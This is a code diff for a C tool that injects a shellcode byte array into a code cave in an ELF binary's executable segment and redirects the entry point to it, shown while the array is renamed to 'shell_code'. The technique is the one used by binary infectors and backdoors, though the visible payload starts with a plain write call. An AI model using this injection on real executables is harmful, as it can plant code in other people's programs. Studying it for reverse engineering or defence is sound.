@@ -12,7 +12,7 @@
 #include "mem_search.h"
 #include "file_mapping.h"
 
-unsigned char program[] = {
+unsigned char shell_code[] = {
     0x52,                                       // push   %rdx
     0xb8, 0x01, 0x00, 0x00, 0x00,               // mov    $0x1,%eax
     0xbf, 0x01, 0x00, 0x00, 0x00,               // mov    $0x1,%edi
@@ -54,18 +54,17 @@ int main(int argc, char* argv[]) {
                         program_headers[i].p_flags & PF_X) {
                     void* code_cave = (char*)find_code_cave(
                         (char*)map + program_headers[i].p_offset,
-                        sizeof(program) + 100,
-                        program_headers[i].p_filesz + sizeof(program) + 100
+                        sizeof(shell_code) + 100,
+                        program_headers[i].p_filesz + sizeof(shell_code) + 100
                     ) + 50;
-                    if (code_cave != NULL)
-                    {
+                    if (code_cave != NULL) {
                         printf("code_cave: %p\n", (void*)((char*)code_cave - (char*)map));
                         int offset = elf_header->e_entry - ((char*)code_cave - (char*)map) - 33;
                         printf("jmp offset: %x (%i)\n", offset, offset);
-                        memcpy(program + 29, &offset, 4);
-                        memcpy(code_cave, program, sizeof(program));
-                        program_headers[i].p_filesz += sizeof(program) + 100;
-                        program_headers[i].p_memsz += sizeof(program) + 100;
+                        memcpy(shell_code + 29, &offset, 4);
+                        memcpy(code_cave, shell_code, sizeof(shell_code));
+                        program_headers[i].p_filesz += sizeof(shell_code) + 100;
+                        program_headers[i].p_memsz += sizeof(shell_code) + 100;
                         elf_header->e_entry = (char*)code_cave - (char*)map;
                         break;
                     }
